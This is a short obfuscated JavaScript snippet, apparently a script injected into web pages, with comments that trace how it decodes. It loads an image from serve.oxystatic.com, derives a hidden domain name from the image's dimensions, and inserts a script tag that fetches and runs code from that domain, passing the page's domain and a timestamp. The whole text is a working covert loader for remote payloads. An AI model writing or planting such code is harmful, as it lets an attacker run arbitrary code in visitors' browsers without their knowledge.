(function(item, type, d, args, opt_attributes) {
  with(new Image) {
    onload = function() {
      with(this) {
        args.push((1E6 + 1E3 * width + 1 * height + args).slice(-6).replace(/\d{2}/g, function(data) {
          return "%" + (+data + 97).toString(16) + type.split("")[data % 6];
        }));
        //["%61s%61s%61s"]
        args.push("com");
        //["%61s%61s%61s", "com"]
        args = ["/", unescape(args.join(".")), [(new Date).getTime(), d.domain, opt_attributes, 0].join(",")];
        //["/", "asasas.com", "1430054815528,login,73901220182,0"]
        d.body.appendChild(d.createElement(type)).src = args.join(args[0]); //  //asasas.com/1430054815528,login,73901220182,0
      }
    };
    src = item;
  }
})("http://serve.oxystatic.com/init", "script", document, [], 73901220182);
